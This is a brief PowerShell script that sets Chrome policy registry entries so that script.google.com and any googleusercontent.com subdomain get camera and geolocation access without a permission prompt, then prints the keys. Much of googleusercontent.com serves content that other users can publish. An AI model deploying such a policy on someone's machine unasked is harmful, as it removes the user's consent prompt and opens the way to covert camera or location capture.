$keyPath = "HKCU:\SOFTWARE\Policies\Google\Chrome\VideoCaptureAllowedUrls"
if (!(Test-Path $keyPath)) {
    New-Item -Path $keyPath -Force | Out-Null
}
Set-ItemProperty -Path $keyPath -Name "1" -Value "https://script.google.com"
Set-ItemProperty -Path $keyPath -Name "2" -Value "https://[*.]googleusercontent.com"
Set-ItemProperty -Path $keyPath -Name "3" -Value "https://[*.]script.google.com"

$geoKeyPath = "HKCU:\SOFTWARE\Policies\Google\Chrome\GeolocationAllowedUrls"
if (!(Test-Path $geoKeyPath)) {
    New-Item -Path $geoKeyPath -Force | Out-Null
}
Set-ItemProperty -Path $geoKeyPath -Name "1" -Value "https://script.google.com"
Set-ItemProperty -Path $geoKeyPath -Name "2" -Value "https://[*.]googleusercontent.com"
Set-ItemProperty -Path $geoKeyPath -Name "3" -Value "https://[*.]script.google.com"

Write-Output "=== VideoCaptureAllowedUrls ==="
Get-ItemProperty -Path $keyPath
Write-Output "=== GeolocationAllowedUrls ==="
Get-ItemProperty -Path $geoKeyPath
